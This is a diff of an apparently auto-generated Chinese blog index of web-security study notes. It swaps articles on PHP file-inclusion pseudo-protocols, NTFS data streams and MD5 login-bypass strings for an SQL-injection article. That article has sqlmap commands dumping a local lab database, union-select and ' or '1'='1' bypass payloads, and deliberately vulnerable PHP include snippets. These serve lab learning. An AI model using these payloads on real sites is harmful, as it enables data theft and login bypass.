@@ -91,7 +91,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/Wireshark/" data-id="cmawczpnz001wik7k4kkc559s" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/Wireshark/" data-id="cmaxy8gbw001vkg7k9aq5ex01" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -187,7 +187,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/dirsearch/" data-id="cmawczpo0001zik7k93e293gr" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/dirsearch/" data-id="cmaxy8gby0022kg7khqcp71ne" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -199,9 +199,9 @@
 
 
   
-    <article id="post-Web/文件包含/PHP伪协议" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <article id="post-Web/注入漏洞/SQL注入" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/" class="article-date">
+    <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/" class="article-date">
   <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
 </a>
     
@@ -211,91 +211,64 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <h1 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h1><h1 id="一、前言【文件包含中的伪协议】-文件包含伪协议-CSDN博客"><a href="#一、前言【文件包含中的伪协议】-文件包含伪协议-CSDN博客" class="headerlink" title="一、前言【文件包含中的伪协议】_文件包含伪协议-CSDN博客"></a>一、前言<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45131319/article/details/138420946?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~baidujs_baidulandingword~Ctr-1-138420946-blog-136493198.235%5Ev43%5Epc_blog_bottom_relevance_base6&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~baidujs_baidulandingword~Ctr-1-138420946-blog-136493198.235%5Ev43%5Epc_blog_bottom_relevance_base6&utm_relevant_index=1">【文件包含中的伪协议】_文件包含伪协议-CSDN博客</a></h1><h2 id="1-什么是PHP伪协议？"><a href="#1-什么是PHP伪协议？" class="headerlink" title="1.什么是PHP伪协议？"></a>1.什么是PHP伪协议？</h2><p>PHP伪协议是PHP自己支持的一种协议与封装协议，简单来说就是PHP定义的一种特殊访问资源的方法。</p>
-<p>有些伪协议成功执行需要allow_url_fopen和allow_url_include的支持。</p>
-<p>allow_url_fopen On&#x2F;Off 允许或禁止打开URL文件<br>allow_url_include On&#x2F;Off 允许或禁止引用URL文件</p>
-<p>‍</p>
-<h2 id="2-什么时候用PHP伪协议"><a href="#2-什么时候用PHP伪协议" class="headerlink" title="2.什么时候用PHP伪协议?"></a>2.什么时候用PHP伪协议?</h2><p>文件包含！！！的时候，可能遇到的文件包含函数：<br>1、include<br>2、require<br>3、include_once<br>4、require_once<br>5、highlight_file<br>6、show_source<br>7、flie<br>8、readfile<br>9、file_get_contents<br>10、file_put_contents<br>11、fopen (比较常见)</p>
-<p>‍</p>
-<h1 id="二、常见的php伪协议"><a href="#二、常见的php伪协议" class="headerlink" title="二、常见的php伪协议"></a>二、常见的php伪协议</h1><p>php:&#x2F;&#x2F;input<br>php:&#x2F;&#x2F;input 是个可以访问请求的原始数据的只读流，获取POST请求数据的协议</p>
-<p>当enctype&#x3D;”multipart&#x2F;form-data” 的时候 php:&#x2F;&#x2F;input 是无效的。</p>
-<p>php:&#x2F;&#x2F;input 伪协议 成功执行前提<br>php.ini 中的 allow_url_include设置为On</p>
-<p>格式示例：  </p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php</span><br><span class="line">&lt;?php</span><br><span class="line">@<span class="built_in">include</span>($_GET[<span class="string">&quot;file&quot;</span>]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>php:&#x2F;&#x2F;filter<br>php:&#x2F;&#x2F;filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。</p>
-<p>在利用上很多都是与包含函数结合使用，读入或者输出获取文件源码然后编码让其不执行从而输出</p>
-<p>php:&#x2F;&#x2F;filter 的使用：<br>如<br>php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php<br>php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;index.php</p>
-<p>php:&#x2F;&#x2F;filter 伪协议组成：<br>read&#x3D;&lt;读链的筛选列表&gt;<br>resource&#x3D;&lt;要过滤的数据流&gt;<br>write&#x3D;&lt;写链的筛选列表&gt;<br>php:&#x2F;&#x2F;filter&#x2F;read&#x3D;处理方式（base64编码，rot13等等）&#x2F;resource&#x3D;要读取的文件</p>
-<p>read 对应要设置的过滤器：<br>常见的过滤器分字符串过滤器、转换过滤器、压缩过滤器、加密过滤器<br>其中convert.base64-encode ，convert.base64-decode都属于 转换过滤器</p>
-<p>格式示例：</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=($_GET[<span class="string">&quot;file&quot;</span>]);</span><br><span class="line"><span class="built_in">echo</span>(<span class="built_in">file_get_contents</span>($a));<span class="comment">//获取文件内容</span></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>zip:&#x2F;&#x2F;与bzip2:&#x2F;&#x2F;与zlib:&#x2F;&#x2F;协议<br>zip:&#x2F;&#x2F; 等属于压缩流的协议，通过直接压缩普通文件为zip文件，再通过zip:&#x2F;&#x2F; 协议读取，可以直接执行php代码。压缩后的zip文件可以随意修改后缀也不影响zip:&#x2F;&#x2F;协议读取。（注意是如phpinfo.txt直接压缩为zip,而不是文件夹压缩zip）</p>
-<p>格式示例：  </p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=($_GET[<span class="string">&quot;file&quot;</span>]);</span><br><span class="line"><span class="built_in">include</span>($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>zip:&#x2F;&#x2F;与bzip2:&#x2F;&#x2F;与zlib:&#x2F;&#x2F;协议<br>zip:&#x2F;&#x2F; 等属于压缩流的协议，通过直接压缩普通文件为zip文件，再通过zip:&#x2F;&#x2F; 协议读取，可以直接执行php代码。压缩后的zip文件可以随意修改后缀也不影响zip:&#x2F;&#x2F;协议读取。（注意是如phpinfo.txt直接压缩为zip,而不是文件夹压缩zip）</p>
-<p>格式示例：</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=($_GET[<span class="string">&quot;file&quot;</span>]);</span><br><span class="line"><span class="built_in">include</span>($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>压缩及协议访问格式：</p>
-<p>压缩文件为.zip后缀<br>zip:&#x2F;&#x2F;绝对路径&#x2F;phpinfo.zip%23phpinfo.php<br>压缩文件为.bz2后缀<br>compress.bzip2:&#x2F;&#x2F;绝对路径&#x2F;phpinfo.zip&#x2F;phpinfo.php<br>压缩文件为.gz后缀<br>compress.zlib:&#x2F;&#x2F;绝对路径&#x2F;phpinfo.zip&#x2F;phpinfo.php</p>
-<p>data:&#x2F;&#x2F;<br>data:&#x2F;&#x2F;伪协议可以通过请求提交的php代码数据配合文件包含函数可以达到代码执行效果。</p>
-<p>data:&#x2F;&#x2F;伪协议 成功执行前提<br>php.ini设置allow_url_include 与allow_url_open都为On。</p>
-<p>data:&#x2F;&#x2F;协议的格式是: data:&#x2F;&#x2F;数据流封装器,相应格式数据</p>
-<p>格式示例：</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=($_GET[<span class="string">&quot;file&quot;</span>]);</span><br><span class="line"><span class="built_in">include</span>($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<h3 id="phar"><a href="#phar" class="headerlink" title="phar:&#x2F;&#x2F;"></a>phar:&#x2F;&#x2F;</h3><p>phar:&#x2F;&#x2F;伪协议可以对zip格式压缩包进行访问解析</p>
-<p>格式示例：</p>
+        <h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p>python sqlmap.py -u <a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs/sqli-labs/Less-1/?id=1">http://127.0.0.1/sqli-labs/sqli-labs/Less-1/?id=1</a></p>
+<p>python sqlmap.py -u <a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs/sqli-labs/Less-1/?id=1">http://127.0.0.1/sqli-labs/sqli-labs/Less-1/?id=1</a> –dbs</p>
+<p>python sqlmap.py -u <a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs/sqli-labs/Less-1/?id=1">http://127.0.0.1/sqli-labs/sqli-labs/Less-1/?id=1</a> -D security –tables</p>
+<p>python sqlmap.py -u <a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs/sqli-labs/Less-1/?id=1">http://127.0.0.1/sqli-labs/sqli-labs/Less-1/?id=1</a> -D security -T users –dump-all</p>
+<p>清除缓存</p>
+<p>python sqlmap.py -u <a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs/sqli-labs/Less-1/?id=1">http://127.0.0.1/sqli-labs/sqli-labs/Less-1/?id=1</a> –purge</p>
+<p>可以用获取cookie得到现在已经登录</p>
+<p>–columns 可以获得指定数据库列&#x2F;表项</p>
+<h1 id="可能需要进阶学习"><a href="#可能需要进阶学习" class="headerlink" title="可能需要进阶学习"></a>可能需要进阶学习</h1><p><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/zh-cn/SQL%E6%B3%A8%E5%85%A5">SQL注入 - 维基百科，自由的百科全书 (wikipedia.org)</a></p>
+<p><a target="_blank" rel="noopener" href="http://www.phpmyadmin.net数据库图形化界面/">www.phpmyadmin.net数据库图形化界面</a>  SQLyog Ultimate 64</p>
 <blockquote>
-<p>phar:&#x2F;&#x2F;绝对路径\phpinfo.zip\phpinfo.php</p>
+<p><strong>information_schema</strong> 库:是信息数据库，其中保存着关于MSQL服务器所维护的所有其他数据库的信息,  比如数据库名，数据库表，表字段的数据类型与访问权限等。Web渗透过程中用途很大。（<strong>摘要</strong>）<br><strong>SCHEMATA</strong> 表 : 提供了当前MySQL实例中所有的数据库信息，<span data-type="text" style="color: var(--b3-font-color12);">show databases</span> 结果取之此表<br><strong>TABLES</strong> 表 : 提供了关于数据中表的信息<br><strong>COLUMNS</strong> 表 : 提供了表中的列信心，详细描述了某张表的所有列已经每个列的信息。<br><strong>mysql</strong> 库 : MySQL的核心数据库，主要负责存储数据库的用户、权限设置、关键字等mysql自己需要使用的<br>控制和管理信息。<br><strong>performance_schema</strong> 库 : 内存数据库，数据放在内存中直接操作的数据库。相对于磁盘，内存的数据读写<br>速度要高出几个数量级，将数据保存在内存中相 比从磁盘上访问能够极大地提高应用的性能<br><strong>sys</strong> 库 : 通过这个数据库数据库，可以査询谁使用了最多的资源 基于IP或是用户。哪张表被访问过最多等等<br>信息。</p>
 </blockquote>
-<p>注意这里与zip:&#x2F;&#x2F;不同的地方是，phar访问压缩包内容是通过&#x2F;访问，而zip是通过#访问</p>
-<blockquote>
-<p>使用这些伪协议时，需要注意PHP配置和服务器环境的限制，某些协议可能因为配置或安全原因被禁用。<br>特别是在处理外部资源（如HTTP或FTP）时，需要注意安全性，确保不会暴露敏感信息或遭受注入攻击。<br>在使用 data:&#x2F;&#x2F;、phar:&#x2F;&#x2F; 等伪协议时，应特别注意数据的验证和清洁，以避免安全漏洞。</p>
-</blockquote>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/" data-id="cmawczpo00022ik7k0b9oal4f" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-Web/文件上传/upload-labs" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/" class="article-date">
-  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="upload-labs"><a href="#upload-labs" class="headerlink" title="upload-labs"></a>upload-labs</h1><p>在· Windows·操作系统中，当你看到文件名后跟着”::$DATA”时，它表示文件的一个附加数据流(Alternate·DataStream，ADS)。数据流是一种用于在文件内部存储额外数据的机制。在普通情况下，我们使用的文件只有一个默认的数据流，可以通过文件名访问。但是Windows·NT·文件系统(NTFS)支持在文件内部创建额外的数据流，以存储其他信息。这些额外的数据流可以通过在文件名后面添加”::$DATA”来访问。<br>例如，”1.txt”是一个文件，而”1.txt:$DATA”是这个文件的一个附加数据流。这样的数据流可以用于存储文件的元数据、备份信息、标签等。<br>需要注意的是，大多数常规的文件操作工具不会意识到这些额外的数据流，而只会处理默认的数据流。要访问或操作这些附加数据流，通常需要使用特定的命令行工具或编程接口</p>
-<p>‍</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45173404/article/details/115712758">MySQL详细学习教程（建议收藏）-CSDN博客</a></p>
+<p><strong>用  1‘ order by 1# 		1‘ order by 2#等进行判断数据库有几列&#x2F;字段</strong></p>
+<h2 id="联合查询其他信息"><a href="#联合查询其他信息" class="headerlink" title="联合查询其他信息"></a>联合查询其他信息</h2><p><strong>union select [sql1][sql2]</strong></p>
+<p>输入 1’ union select user(),database()#</p>
+<p>用户输入sql语句，执行了MySQL内置函数user()和database()</p>
 <p>‍</p>
 <blockquote>
-<p><span data-type="text" style="background-color: var(--b3-card-error-background); color: var(--b3-card-error-color);">写入方法:(命令行)<br>echo·内容·&gt;&gt;文件名:数据流名<br>type· 文件名&gt;&gt;文件名:数据流名<br>查看方法:<br>notepad·文件名:数据流名</span></p>
+<p>system_user()				管理员</p>
+<p>user()					用户</p>
+<p>current_user()				</p>
+<p>database()				库</p>
+<p>version()					版本</p>
+<p>@@datadir				mysql安装路径</p>
+<p>@@version_compile_os		当前的操作系统</p>
 </blockquote>
+<p>‍</p>
+<p>如果很多语句被过滤掉，我们可以尝试双写绕过</p>
+<p>​<code>username=1’ununionion seselectlect 1#&amp;password=1</code>​</p>
+<p>‍</p>
+<h2 id="SQL注入的产生原因"><a href="#SQL注入的产生原因" class="headerlink" title="SQL注入的产生原因:"></a>SQL注入的产生原因:</h2><p>当Web应用向后台数据库传递SQL语句进行数据库操作时，如果对用户输入的参数没有经过<span data-type="text" style="color: var(--b3-font-color8);">严格的过滤处理</span>，那么攻击者就可以构造特殊的SQL语句，直接输入数据库引擎执行，获取或修改数据库中的数据。</p>
+<h2 id="本质：-把用户输入的数据当成是代码来执行"><a href="#本质：-把用户输入的数据当成是代码来执行" class="headerlink" title="本质： 把用户输入的数据当成是代码来执行"></a>本质： 把用户输入的数据当成是代码来执行</h2><p>两个关键点： 预编译可以防备SQL注入（所有漏洞都是有条件的！！！）</p>
+<p>1、用户能够控制输入的内容；</p>
+<p>2、数据库能够执行用户输入的内容。</p>
+<h2 id="SQl注入的危害："><a href="#SQl注入的危害：" class="headerlink" title="SQl注入的危害："></a>SQl注入的危害：</h2><p>盗取网站的敏感信息；</p>
+<p>绕过网站后台的认证；</p>
+<pre><code>  万能密码： &#39; or &#39;1&#39; = &#39; 1&#39; #
+</code></pre>
+<p>limit 0,1  <kbd>0代表先从第几行开始回显，1代表显示几行</kbd>​</p>
+<p>后台登陆的SQL语句： select * from users where username&#x3D; ‘$user’ and password&#x3D;’$pass’</p>
+<p>‍</p>
+<h2 id="SQL注入的漏洞"><a href="#SQL注入的漏洞" class="headerlink" title="SQL注入的漏洞"></a>SQL注入的漏洞</h2><p>根据注入位置分类： GET类、POST类、Head头注入</p>
+<p>根据反馈结果分类： 有回显（显错注入）、无回显（盲注）</p>
+<p>根据数据类型分类：</p>
+<pre><code>	数字型： 输入的参数为整型，如id、年龄、页码等（&lt;span data-type=&quot;text&quot; style=&quot;color: var(--b3-font-color8);&quot;&gt;SQL注入中数字型没有小数&lt;/span&gt;）
+
+	字符型： 输入的参数为字符串
+</code></pre>
+<p>数字型与字符型最大的区别在于：数字型不需要闭合，而字符型一般需要<span data-type="text" style="color: var(--b3-font-color8);">闭合</span></p>
+<p>‍</p>
 <p>‍</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/" data-id="cmawczpo10028ik7kgy4ift2c" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/" data-id="cmaxy8gby0024kg7kauf2gmxg" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -437,222 +410,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E7%BB%95%E8%BF%87/%E6%8C%87%E4%BB%A4%E7%BB%95%E8%BF%87/" data-id="cmawczpo2002cik7ke2onfw9f" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-Web/绕过/神奇的MD5" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/05/20/Web/%E7%BB%95%E8%BF%87/%E7%A5%9E%E5%A5%87%E7%9A%84MD5/" class="article-date">
-  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="神奇的MD5"><a href="#神奇的MD5" class="headerlink" title="神奇的MD5"></a>神奇的MD5</h1><h4 id="奇妙的字符串"><a href="#奇妙的字符串" class="headerlink" title="奇妙的字符串"></a>奇妙的字符串</h4><p>一个是MD5加密后弱比较等于自身，这个字符串是 0e215962017 ：</p>
-<p>另一个是 MD5 加密后变成万能密码，这个字符串是 ffifdyop ：</p>
-<blockquote>
-<p>经过md5加密后：276f722736c95d99e921722cf9ed621c<br>再转换为字符串：‘or’6&lt;乱码&gt; 即 ‘or’66�]��!r,��b<br>用途：<br>select * from admin where password=’‘or’6&lt;乱码&gt;’<br>就相当于select * from admin where password=’’or 1 实现sql注入</p>
-</blockquote>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>;;) &#123; </span><br><span class="line"> <span class="keyword">for</span> (<span class="variable">$c</span> = <span class="number">0</span>; <span class="variable">$c</span> &lt; <span class="number">1000000</span>; <span class="variable">$c</span>++, <span class="variable">$i</span>++)</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$i</span>, <span class="literal">true</span>), <span class="string">&#x27;\&#x27;or\&#x27;&#x27;</span>) !== <span class="literal">false</span>)</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;\nmd5(<span class="subst">$i</span>) = &quot;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$i</span>, <span class="literal">true</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&quot;.&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>‍</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E7%BB%95%E8%BF%87/%E7%A5%9E%E5%A5%87%E7%9A%84MD5/" data-id="cmawczpo2002dik7k51rqgxha" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-Web/注入漏洞/SQL注入" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/" class="article-date">
-  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p>python sqlmap.py -u <a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs/sqli-labs/Less-1/?id=1">http://127.0.0.1/sqli-labs/sqli-labs/Less-1/?id=1</a></p>
-<p>python sqlmap.py -u <a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs/sqli-labs/Less-1/?id=1">http://127.0.0.1/sqli-labs/sqli-labs/Less-1/?id=1</a> –dbs</p>
-<p>python sqlmap.py -u <a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs/sqli-labs/Less-1/?id=1">http://127.0.0.1/sqli-labs/sqli-labs/Less-1/?id=1</a> -D security –tables</p>
-<p>python sqlmap.py -u <a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs/sqli-labs/Less-1/?id=1">http://127.0.0.1/sqli-labs/sqli-labs/Less-1/?id=1</a> -D security -T users –dump-all</p>
-<p>清除缓存</p>
-<p>python sqlmap.py -u <a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs/sqli-labs/Less-1/?id=1">http://127.0.0.1/sqli-labs/sqli-labs/Less-1/?id=1</a> –purge</p>
-<p>可以用获取cookie得到现在已经登录</p>
-<p>–columns 可以获得指定数据库列&#x2F;表项</p>
-<h1 id="可能需要进阶学习"><a href="#可能需要进阶学习" class="headerlink" title="可能需要进阶学习"></a>可能需要进阶学习</h1><p><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/zh-cn/SQL%E6%B3%A8%E5%85%A5">SQL注入 - 维基百科，自由的百科全书 (wikipedia.org)</a></p>
-<p><a target="_blank" rel="noopener" href="http://www.phpmyadmin.net数据库图形化界面/">www.phpmyadmin.net数据库图形化界面</a>  SQLyog Ultimate 64</p>
-<blockquote>
-<p><strong>information_schema</strong> 库:是信息数据库，其中保存着关于MSQL服务器所维护的所有其他数据库的信息,  比如数据库名，数据库表，表字段的数据类型与访问权限等。Web渗透过程中用途很大。（<strong>摘要</strong>）<br><strong>SCHEMATA</strong> 表 : 提供了当前MySQL实例中所有的数据库信息，<span data-type="text" style="color: var(--b3-font-color12);">show databases</span> 结果取之此表<br><strong>TABLES</strong> 表 : 提供了关于数据中表的信息<br><strong>COLUMNS</strong> 表 : 提供了表中的列信心，详细描述了某张表的所有列已经每个列的信息。<br><strong>mysql</strong> 库 : MySQL的核心数据库，主要负责存储数据库的用户、权限设置、关键字等mysql自己需要使用的<br>控制和管理信息。<br><strong>performance_schema</strong> 库 : 内存数据库，数据放在内存中直接操作的数据库。相对于磁盘，内存的数据读写<br>速度要高出几个数量级，将数据保存在内存中相 比从磁盘上访问能够极大地提高应用的性能<br><strong>sys</strong> 库 : 通过这个数据库数据库，可以査询谁使用了最多的资源 基于IP或是用户。哪张表被访问过最多等等<br>信息。</p>
-</blockquote>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45173404/article/details/115712758">MySQL详细学习教程（建议收藏）-CSDN博客</a></p>
-<p><strong>用  1‘ order by 1# 		1‘ order by 2#等进行判断数据库有几列&#x2F;字段</strong></p>
-<h2 id="联合查询其他信息"><a href="#联合查询其他信息" class="headerlink" title="联合查询其他信息"></a>联合查询其他信息</h2><p><strong>union select [sql1][sql2]</strong></p>
-<p>输入 1’ union select user(),database()#</p>
-<p>用户输入sql语句，执行了MySQL内置函数user()和database()</p>
-<p>‍</p>
-<blockquote>
-<p>system_user()				管理员</p>
-<p>user()					用户</p>
-<p>current_user()				</p>
-<p>database()				库</p>
-<p>version()					版本</p>
-<p>@@datadir				mysql安装路径</p>
-<p>@@version_compile_os		当前的操作系统</p>
-</blockquote>
-<p>‍</p>
-<p>如果很多语句被过滤掉，我们可以尝试双写绕过</p>
-<p>​<code>username=1’ununionion seselectlect 1#&amp;password=1</code>​</p>
-<p>‍</p>
-<h2 id="SQL注入的产生原因"><a href="#SQL注入的产生原因" class="headerlink" title="SQL注入的产生原因:"></a>SQL注入的产生原因:</h2><p>当Web应用向后台数据库传递SQL语句进行数据库操作时，如果对用户输入的参数没有经过<span data-type="text" style="color: var(--b3-font-color8);">严格的过滤处理</span>，那么攻击者就可以构造特殊的SQL语句，直接输入数据库引擎执行，获取或修改数据库中的数据。</p>
-<h2 id="本质：-把用户输入的数据当成是代码来执行"><a href="#本质：-把用户输入的数据当成是代码来执行" class="headerlink" title="本质： 把用户输入的数据当成是代码来执行"></a>本质： 把用户输入的数据当成是代码来执行</h2><p>两个关键点： 预编译可以防备SQL注入（所有漏洞都是有条件的！！！）</p>
-<p>1、用户能够控制输入的内容；</p>
-<p>2、数据库能够执行用户输入的内容。</p>
-<h2 id="SQl注入的危害："><a href="#SQl注入的危害：" class="headerlink" title="SQl注入的危害："></a>SQl注入的危害：</h2><p>盗取网站的敏感信息；</p>
-<p>绕过网站后台的认证；</p>
-<pre><code>  万能密码： &#39; or &#39;1&#39; = &#39; 1&#39; #
-</code></pre>
-<p>limit 0,1  <kbd>0代表先从第几行开始回显，1代表显示几行</kbd>​</p>
-<p>后台登陆的SQL语句： select * from users where username&#x3D; ‘$user’ and password&#x3D;’$pass’</p>
-<p>‍</p>
-<h2 id="SQL注入的漏洞"><a href="#SQL注入的漏洞" class="headerlink" title="SQL注入的漏洞"></a>SQL注入的漏洞</h2><p>根据注入位置分类： GET类、POST类、Head头注入</p>
-<p>根据反馈结果分类： 有回显（显错注入）、无回显（盲注）</p>
-<p>根据数据类型分类：</p>
-<pre><code>	数字型： 输入的参数为整型，如id、年龄、页码等（&lt;span data-type=&quot;text&quot; style=&quot;color: var(--b3-font-color8);&quot;&gt;SQL注入中数字型没有小数&lt;/span&gt;）
-
-	字符型： 输入的参数为字符串
-</code></pre>
-<p>数字型与字符型最大的区别在于：数字型不需要闭合，而字符型一般需要<span data-type="text" style="color: var(--b3-font-color8);">闭合</span></p>
-<p>‍</p>
-<p>‍</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/" data-id="cmawczpo3002fik7k3d0f6wow" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-Web/工具使用/sqlmap/sqlmap通关sqli-labs" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/sqlmap/sqlmap%E9%80%9A%E5%85%B3sqli-labs/" class="article-date">
-  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
